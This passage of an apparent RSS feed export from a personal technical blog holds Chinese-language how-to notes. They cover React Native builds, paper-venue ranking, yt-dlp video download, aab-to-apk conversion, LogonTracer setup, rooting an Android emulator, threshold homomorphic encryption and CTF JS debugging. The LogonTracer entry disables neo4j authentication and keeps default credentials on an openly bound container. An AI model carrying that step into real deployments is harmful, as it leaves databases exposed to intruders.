 &lt;a class="anchor" href="#2-%e6%aa%a2%e6%9f%a5-react-native-%e9%a0%85%e7%9b%ae%e9%85%8d%e7%bd%ae">#&lt;/a>
&lt;/h2>
&lt;p>在項目中，確保以下內容已經配置：&lt;/p>
&lt;h3 id="文件">
 &lt;strong>文件 &lt;code>android/app/build.gradle&lt;/code>&lt;/strong>
 &lt;a class="anchor" href="#%e6%96%87%e4%bb%b6">#&lt;/a>
&lt;/h3>
&lt;p>確認 &lt;code>minSdkVersion&lt;/code> 和 &lt;code>targetSdkVersion&lt;/code> 值符合要求，例如：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gradle" data-lang="gradle">&lt;span style="display:flex;">&lt;span>android &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> defaultConfig &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> applicationId &lt;span style="color:#e6db74">&amp;#34;com.example.myapp&amp;#34;&lt;/span> &lt;span style="color:#75715e">// 替換為你的包名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> minSdkVersion &lt;span style="color:#ae81ff">21&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> targetSdkVersion &lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="文件-1">
 &lt;strong>文件 &lt;code>android/gradle.properties&lt;/code>&lt;/strong>
 &lt;a class="anchor" href="#%e6%96%87%e4%bb%b6-1">#&lt;/a>
&lt;/h3>
&lt;p>啟用 ProGuard 和 Hermes 以優化 APK：&lt;/p></description></item><item><title>How to check if the paper is Top Conference or Q1 Journal?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-check-if-the-paper-is-top-conference-or-q1-journal_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-check-if-the-paper-is-top-conference-or-q1-journal_/</guid><description>&lt;h1 id="how-to-check-if-the-paper-is-top-conference-or-q1-journal">
 How to check if the paper is Top Conference or Q1 Journal?
 &lt;a class="anchor" href="#how-to-check-if-the-paper-is-top-conference-or-q1-journal">#&lt;/a>
&lt;/h1>
&lt;h2 id="preliminary">
 Preliminary
 &lt;a class="anchor" href="#preliminary">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>先判斷該篇論文是Conference還是Journal
&lt;blockquote>
&lt;p>有出現Conference, Symposium, Proceedings, ACM: SIG…, Ex. SIGSOFT, SIGGRAPH等關鍵字時，基本上是Conference
有出現Journal或是Transactions基本上是Journal
[name=ianyang]&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="conference">
 Conference
 &lt;a class="anchor" href="#conference">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>(不推薦)直接看有沒有在Google Scholar Ranking當中
如果是Engineer &amp;amp; Computer Science的，可以直接看 &lt;a href="https://scholar.google.com/citations?view_op=top_venues&amp;amp;hl=zh-TW&amp;amp;vq=eng">https://scholar.google.com/citations?view_op=top_venues&amp;hl=zh-TW&amp;vq=eng&lt;/a> ，不過這個方法也要知道該篇論文在Subcatecory當中的哪一個類別，可能該篇論文有用到很多元素，就不太好判斷&lt;/li>
&lt;li>(推薦)直接丟 &lt;a href="https://www.myhuiban.com/">https://www.myhuiban.com/&lt;/a> (有收錄中國、巴西和澳洲的等第)或 &lt;a href="https://portal.core.edu.au/conf-ranks/">https://portal.core.edu.au/conf-ranks/&lt;/a> (澳洲政府開的學術研討會搜尋網站)，如果這兩個網站找不到或是有找到但沒有標示等第，那可能是不入流或是比較新的研討會&lt;/li>
&lt;li>(推薦)直接問博班或是對該領域很熟的同學
&lt;ul>
&lt;li>舉例來說IOP這個出版社我也沒聽過，但是@ian 說是一個以Open Source為主的出版社，所以他們出的一些Journal有機會是Q1，但如果是Conference可能就有點危&lt;/li>
&lt;li>再舉例想是Spinger出版的可能都不是頂會，以CS領域來說，Springer出版的論文很少出現在頂會，Elsevier也是一樣的狀況&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>(最後的方法)丟Google或是進官網找，看會議是誰主辦
只有很少的會議有這樣的狀況，例如&lt;a href="https://conf.researchr.org/home/icse-2025">ICSE&lt;/a>，他底下就有很多Co-Hosted的會議是切分出來的
![圖片](&lt;a href="https://hackmd.io/_uploads/rJrV-uzkJx.png">https://hackmd.io/_uploads/rJrV-uzkJx.png&lt;/a> =500x)
但本質上也還是ICSE主辦的，所以也算頂會，只是通常收錄的paper，他的reference citation會寫Co-Hosted的名稱而不是ICSE，這樣的話一般researcher可能會不知道這是什麼樣的conference，所以要往上一個level看他是誰主辦，但這是沒有辦法中的辦法，可能會走到這一步的情況是，有一個很多人cite的Paper也是自己的研究中主要比較對象，但透過以上方法都找不到，才會需要做到這個複雜
:::info
如果是IEEE或是ACM出版的，大部分都可能是頂會，但也要看，如果是自己論文的主要比較對象，就要再確定，但如果只是一般的引用，可以不用那麼detail或是執著一定要是頂會
:::&lt;/li>
&lt;/ul>
&lt;h2 id="journal">
 Journal
 &lt;a class="anchor" href="#journal">#&lt;/a>
&lt;/h2>
&lt;p>這個就簡單很多，直接用Clarivate查JCI，如果沒有就代表沒有收錄在JCR，那可能就先不要引用，或者是有Transactions的關鍵字，代表他一定曾經是頂會，https://jcr.clarivate.com/jcr/home&lt;/p></description></item><item><title>How to download blob videos?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-download-blob-videos_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-download-blob-videos_/</guid><description>&lt;h1 id="how-to-download-blob-videos">
 How to download blob videos?
 &lt;a class="anchor" href="#how-to-download-blob-videos">#&lt;/a>
&lt;/h1>
&lt;p>參考資料: &lt;a href="https://stackoverflow.com/questions/42901942/how-do-we-download-a-blob-url-video">https://stackoverflow.com/questions/42901942/how-do-we-download-a-blob-url-video&lt;/a>
參考資料: &lt;a href="https://superuser.com/questions/1260846/downloading-m3u8-videos">https://superuser.com/questions/1260846/downloading-m3u8-videos&lt;/a>&lt;/p>
&lt;h2 id="prerequisite">
 Prerequisite
 &lt;a class="anchor" href="#prerequisite">#&lt;/a>
&lt;/h2>
&lt;p>有兩種方法，一種是利用ffmpeg，另外一種是&lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Installation">yt-dlp&lt;/a>，前者下載比較慢，後者快很多，但都可以正確的下載&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Ffmpeg&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install ffmpeg -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># yt-dlp Windows&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ choco install yt-dlp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># yt-dlp linux&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo add-apt-repository ppa:tomtomtom/yt-dlp &lt;span style="color:#75715e"># Add ppa repo to apt&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt update &lt;span style="color:#75715e"># Update package list&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt install yt-dlp &lt;span style="color:#75715e"># Install yt-dlp&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="step">
 Step
 &lt;a class="anchor" href="#step">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>透過Browser的F12找出m3u8的封包
&lt;img src="https://hackmd.io/_uploads/HyrYRTR4kl.png" alt="image" />&lt;/li>
&lt;li>透過yt-dlp下載
複製封包的Request URL
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ yt-dlp &lt;span style="color:#e6db74">&amp;#34;https://surrit.com/9e2613de-2337-4cfd-aab5-2a68c0fbad14/playlist.m3u8&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>How to install aab file?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-install-aab-file_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-install-aab-file_/</guid><description>&lt;h1 id="how-to-install-aab-file">
 How to install aab file?
 &lt;a class="anchor" href="#how-to-install-aab-file">#&lt;/a>
&lt;/h1>
&lt;h2 id="problem-statement">
 Problem Statement
 &lt;a class="anchor" href="#problem-statement">#&lt;/a>
&lt;/h2>
&lt;p>有時候我們會直接拿到aab檔案而非apk，尤其是用React Native寫的專案，但又無法直接安裝這個aab檔案，他需要經過一些步驟才能轉成apk&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>先確保本機有安裝keytool和bundletool，keytool一般會在&lt;code>C:\Program File\Java\jdk-17\bin&lt;/code>中，只要設定環境變數就可以直接使用；而bundletool則是要另外&lt;a href="https://github.com/google/bundletool/releases">下載&lt;/a>，有關於如何寫成bat，可以參考&lt;a href="https://blog.csdn.net/yingaizhu/article/details/119545459">bundletool 工具使用詳解&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ keytool -genkeypair -v -keystore my-release-key.jks -keyalg RSA -keysize &lt;span style="color:#ae81ff">2048&lt;/span> -validity &lt;span style="color:#ae81ff">10000&lt;/span> -alias my-key-alias
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 填寫基本資訊&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ bundletool build-apks --bundle&lt;span style="color:#f92672">=&lt;/span>&amp;lt;your aab filename&amp;gt; --output&lt;span style="color:#f92672">=&lt;/span>app.apks --ks&lt;span style="color:#f92672">=&lt;/span>./my-release-key.jks --ks-key-alias&lt;span style="color:#f92672">=&lt;/span>my-key-alias
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ bundletool install-apks --apks&lt;span style="color:#f92672">=&lt;/span>app.apks
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>How to install LogonTracer?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-install-logontracer_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-install-logontracer_/</guid><description>&lt;h1 id="how-to-install-logontracer">
 How to install LogonTracer?
 &lt;a class="anchor" href="#how-to-install-logontracer">#&lt;/a>
&lt;/h1>
&lt;h2 id="installation">
 Installation
 &lt;a class="anchor" href="#installation">#&lt;/a>
&lt;/h2>
&lt;h3 id="環境">
 環境
 &lt;a class="anchor" href="#%e7%92%b0%e5%a2%83">#&lt;/a>
&lt;/h3>
&lt;p>WSL2 - Ubuntu 20.04
Docker&lt;/p>
&lt;h3 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h3>
&lt;p>&lt;a href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/84E5EAA4BC494BB6A4B15607E62418A0">二刀流Windows日誌分析　精準掌握資安蛛絲馬跡&lt;/a>&lt;/p>
&lt;h3 id="docker-version">
 Docker Version
 &lt;a class="anchor" href="#docker-version">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>安裝Docker(上網找)&lt;/li>
&lt;li>Pull Image &amp;amp; Run
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker pull jpcertcc/docker-logontracer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker run --detach --publish&lt;span style="color:#f92672">=&lt;/span>7474:7474 --publish&lt;span style="color:#f92672">=&lt;/span>7687:7687 --publish&lt;span style="color:#f92672">=&lt;/span>8080:8080 -e LTHOSTNAME&lt;span style="color:#f92672">=&lt;/span>0.0.0.0 jpcertcc/docker-logontracer
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>先進入neo4j(&lt;code>localhost:7474&lt;/code>)
預設密碼: &lt;code>neo4j/neo4j&lt;/code>
:::info
若有遇到登入不進去的問題，error message$\to$&lt;code>Neo.ClientError.Security.Unauthorized: The client is unauthorized due to authentication failure.&lt;/code>
可參考&lt;a href="https://blog.csdn.net/weixin_39198406/article/details/85068102">訪問neo4j驗證失敗&lt;/a>，我是直接把neo4j.conf的驗證註解拿掉
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker exec -it &lt;span style="color:#f92672">{&lt;/span>neo4j container name&lt;span style="color:#f92672">}&lt;/span> bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@5aac14bfd6fd:/var/lib/neo4j# find / -name neo4j.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/var/lib/neo4j/conf/neo4j.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@5aac14bfd6fd:/var/lib/neo4j# cd conf/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@5aac14bfd6fd:/var/lib/neo4j/conf# apt install vim -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@5aac14bfd6fd:/var/lib/neo4j/conf# vim neo4j.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 只要把dbms.security.auth_enabled=false的註解拿掉就可以了&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@5aac14bfd6fd:/var/lib/neo4j/conf# exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker restart nifty_stonebraker
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nifty_stonebraker
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>之後再重新進入&lt;code>localhost:7474&lt;/code>，用預設帳密登入就可以了
:::&lt;/li>
&lt;li>進入LogonTracer(&lt;code>localhost:8080&lt;/code>)
預設帳密也是&lt;code>neo4j/neo4j&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="python-version-recommended">
 Python Version (Recommended)
 &lt;a class="anchor" href="#python-version-recommended">#&lt;/a>
&lt;/h3>
&lt;p>如果上面的版本不行用的話，就直接用他們發在&lt;a href="https://github.com/JPCERTCC/LogonTracer/wiki/how-to-use">github的版本&lt;/a>會比較穩定，詳細的步驟都已經寫在他們wiki了，不過有幾個問題還是需要先克服&lt;/p></description></item><item><title>How to Root Android Phone &amp; Install AlwaysTrustUserCert.zip Module?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-root-android-phone--install-alwaystrustusercert.zip-module_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-root-android-phone--install-alwaystrustusercert.zip-module_/</guid><description>&lt;h1 id="how-to-root-android-phone--install-alwaystrustusercertzip-module">
 How to Root Android Phone &amp;amp; Install AlwaysTrustUserCert.zip Module?
 &lt;a class="anchor" href="#how-to-root-android-phone--install-alwaystrustusercertzip-module">#&lt;/a>
&lt;/h1>
&lt;ol>
&lt;li>Install &lt;a href="https://github.com/K3V1991/ADB-and-FastbootPlusPlus/releases">adb &amp;amp; fastboot++&lt;/a>&lt;/li>
&lt;li>透過USB連接手機和電腦，如果測試&lt;code>$ fastboot devices&lt;/code>發現沒有抓到連線的裝置可以到&lt;a href="https://developer.android.com/studio/run/win-usb">Get the Google USB Driver&lt;/a>下載最新的驅動，並且在裝置管理員的地方更新&lt;/li>
&lt;/ol>
&lt;h2 id="android-studio-emulator">
 Android Studio Emulator
 &lt;a class="anchor" href="#android-studio-emulator">#&lt;/a>
&lt;/h2>
&lt;p>本方法完全是參考&lt;a href="https://youtu.be/zZZVoUTZipw?si=-r7H1aWTeTDFkSOr">Root an Android emulator with just one command&lt;/a>，很簡單而且成功率很高，如果有特殊的需求而需要使用Physical Device，再往下看其他的Physical Device的Rooted Method&lt;/p>
&lt;ol>
&lt;li>用Android Studio開啟Emulator
請記住Emulator的API Level，以我的為例是31
&lt;img src="https://hackmd.io/_uploads/Hy2UPOFAR.png" alt="圖片" />&lt;/li>
&lt;li>Download Script &amp;amp; Execute it
到 &lt;a href="https://gitlab.com/newbit/rootAVD">https://gitlab.com/newbit/rootAVD&lt;/a> 下載latest script
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://gitlab.com/newbit/rootAVD
$ cd rootAVD
$ rootAVD.bat ListAllAVDs
...
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img FAKEBOOTIMG
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img DEBUG PATCHFSTAB GetUSBHPmodZ
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img restore
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img InstallKernelModules
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img InstallPrebuiltKernelModules
rootAVD.bat system-images\android-31\google_apis_playstore\x86_64\ramdisk.img InstallPrebuiltKernelModules GetUSBHPmodZ PATCHFSTAB DEBUG
...
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>選擇適當的command
可以從上面的output看到，API Level 31的所有commands，選擇第一個執行就可以了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ rootAVD.bat system-images&lt;span style="color:#ae81ff">\a&lt;/span>ndroid-31&lt;span style="color:#ae81ff">\g&lt;/span>oogle_apis_playstore&lt;span style="color:#ae81ff">\x&lt;/span>86_64&lt;span style="color:#ae81ff">\r&lt;/span>amdisk.img
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>等大約3-5分鐘後，Emulator會自動關機，此時選擇Cold Boot
&lt;img src="https://hackmd.io/_uploads/Sy__O_YCA.png" alt="圖片" />
開啟後，會發現Magisk已經被安裝在Emulator上，點開Magisk之後會在5秒內重開機，此時所有程序應該就結束了，可以測試一下有沒有確實Root
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ adb shell
emulator64_x86_64_arm64:/ $ ls /data/data
ls: /data/data: Permission denied
1|emulator64_x86_64_arm64:/ $ su
emulator64_x86_64_arm64:/ # ls /data/data
android com.android.simappdialog
android.auto_generated_rro_product__ com.android.simappdialog.auto_generated_rro_product__
android.auto_generated_rro_vendor__ com.android.soundpicker
...
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="asus-zenfone-3z017da">
 ASUS ZenFone 3(Z017DA)
 &lt;a class="anchor" href="#asus-zenfone-3z017da">#&lt;/a>
&lt;/h2>
&lt;p>這一台是Lab的手機，我拿到的時候就已經進入Bootloader了，所以我就直接跳到後半段，但是這一台應該是刷壞了，我先紀錄一下整個過程，現在是已經無線迴圈同一個畫面了QAQ&lt;/p></description></item><item><title>How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/</guid><description>&lt;h1 id="how-to-securely-collaborate-on-data-decentralized-threshold-he-and-secure-key-update---notes">
 How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes
 &lt;a class="anchor" href="#how-to-securely-collaborate-on-data-decentralized-threshold-he-and-secure-key-update---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Kim, E., Jeong, J., Yoon, H., Kim, Y., Cho, J., &amp;amp; Cheon, J. H. (2020). How to securely collaborate on data: Decentralized threshold he and secure key update. IEEE Access, 8, 191319-191329.
:::
[TOC]&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="threshold-homomorphic-encryption---閾值同態加密在隱私計算中的應用">
 &lt;a href="https://www.cnblogs.com/pam-sh/p/16446840.html">Threshold Homomorphic Encryption - 閾值同態加密在隱私計算中的應用&lt;/a>
 &lt;a class="anchor" href="#threshold-homomorphic-encryption---%e9%96%be%e5%80%bc%e5%90%8c%e6%85%8b%e5%8a%a0%e5%af%86%e5%9c%a8%e9%9a%b1%e7%a7%81%e8%a8%88%e7%ae%97%e4%b8%ad%e7%9a%84%e6%87%89%e7%94%a8">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>單密鑰同態加密
只有一個私鑰，且不同公鑰加密的密文無法相互計算。&lt;/li>
&lt;li>閾值同態加密（多密鑰加密）
支持多個私鑰，不同公鑰加密的密文可以互相計算。&lt;/li>
&lt;/ol>
&lt;h4 id="問題">
 問題
 &lt;a class="anchor" href="#%e5%95%8f%e9%a1%8c">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>多方聯合計算最安全的途徑是各自生成、保存公私鑰,但由於算法限制,不同公鑰加密的信息無法進行相互計算,導致隱私計算無法進行&lt;/li>
&lt;li>假設多方使用一套公私鑰,雖然計算可以順利進行,但系統安全性會大大下降,系統中只要有一方被成功攻擊,私鑰就會泄露。&lt;/li>
&lt;li>假設多方使用一套公私鑰,則無法決定由哪個參與方生成公私鑰&lt;/li>
&lt;/ol>
&lt;h4 id="solution---threshold-homomorphic-encryption">
 Solution - Threshold Homomorphic Encryption
 &lt;a class="anchor" href="#solution---threshold-homomorphic-encryption">#&lt;/a>
&lt;/h4>
&lt;p>由於單密鑰同態加密在實際應用中存在諸多關於密鑰使用、管理的問題,閾值同態加密(多密鑰同態加密)應運而生。簡單來說,閾值同態加密算法中存在多個私鑰、一個(或多個公鑰,使用該公鑰系統加密的密文之間可以相互計算,並且只有當參與解密的私鑰數量達到一定閾值時,才能成功解密密文,所以這種多密鑰同態加密算法又被稱為閾值同態加密&lt;/p></description></item><item><title>How to use VScode / Web Storm Debug JS?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-use-vscode-_-web-storm-debug-js_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-use-vscode-_-web-storm-debug-js_/</guid><description>&lt;h1 id="how-to-use-vscode--web-storm-debug-js">
 How to use VScode / Web Storm Debug JS?
 &lt;a class="anchor" href="#how-to-use-vscode--web-storm-debug-js">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://a0910288060.medium.com/%E4%BA%86%E8%A7%A3node-js-nvm-npm%E5%B7%AE%E5%88%A5-47cda7c1d569">了解node.js nvm npm差別&lt;/a>&lt;/p>
&lt;h2 id="prepare-js-modules">
 Prepare JS Modules
 &lt;a class="anchor" href="#prepare-js-modules">#&lt;/a>
&lt;/h2>
&lt;p>當拿到一個web題目，通常會包含Dockerfile / docker-compose.yml / package.json，我們要做的就是把這個專案所需要的library都載好，這些通常都會記錄在package.json中&lt;/p>
&lt;ul>
&lt;li>Windows
在windows也需要下載js的interpreter，也就是node js / npm這些東西，詳細可以看&lt;a href="https://learn.microsoft.com/zh-tw/windows/dev-environment/javascript/nodejs-on-windows">MSDN文件&lt;/a>
&lt;ol>
&lt;li>到&lt;a href="https://github.com/coreybutler/nvm-windows/releases">nvm windows github官方&lt;/a>下載latest ==nvm-setup.exe==並安裝
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nvm --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1.1.12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nvm ls &lt;span style="color:#75715e"># 列出目前node js的已安裝的版本有哪些&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No installations recognized. &lt;span style="color:#75715e"># 因為目前都沒有所以No installations&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nvm list available &lt;span style="color:#75715e"># 列出目前可安裝的版本有哪些&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| CURRENT | LTS | OLD STABLE | OLD UNSTABLE |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|--------------|--------------|--------------|--------------|
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.5.0 | 20.10.0 | 0.12.18 | 0.11.16 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.4.0 | 20.9.0 | 0.12.17 | 0.11.15 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.3.0 | 18.19.0 | 0.12.16 | 0.11.14 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.2.0 | 18.18.2 | 0.12.15 | 0.11.13 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.1.0 | 18.18.1 | 0.12.14 | 0.11.12 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 21.0.0 | 18.18.0 | 0.12.13 | 0.11.11 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.8.1 | 18.17.1 | 0.12.12 | 0.11.10 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.8.0 | 18.17.0 | 0.12.11 | 0.11.9 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.7.0 | 18.16.1 | 0.12.10 | 0.11.8 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.6.1 | 18.16.0 | 0.12.9 | 0.11.7 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.6.0 | 18.15.0 | 0.12.8 | 0.11.6 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.5.1 | 18.14.2 | 0.12.7 | 0.11.5 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.5.0 | 18.14.1 | 0.12.6 | 0.11.4 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.4.0 | 18.14.0 | 0.12.5 | 0.11.3 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.3.1 | 18.13.0 | 0.12.4 | 0.11.2 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.3.0 | 18.12.1 | 0.12.3 | 0.11.1 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.2.0 | 18.12.0 | 0.12.2 | 0.11.0 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.1.0 | 16.20.2 | 0.12.1 | 0.9.12 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 20.0.0 | 16.20.1 | 0.12.0 | 0.9.11 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 19.9.0 | 16.20.0 | 0.10.48 | 0.9.10 |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>選擇一個版本安裝
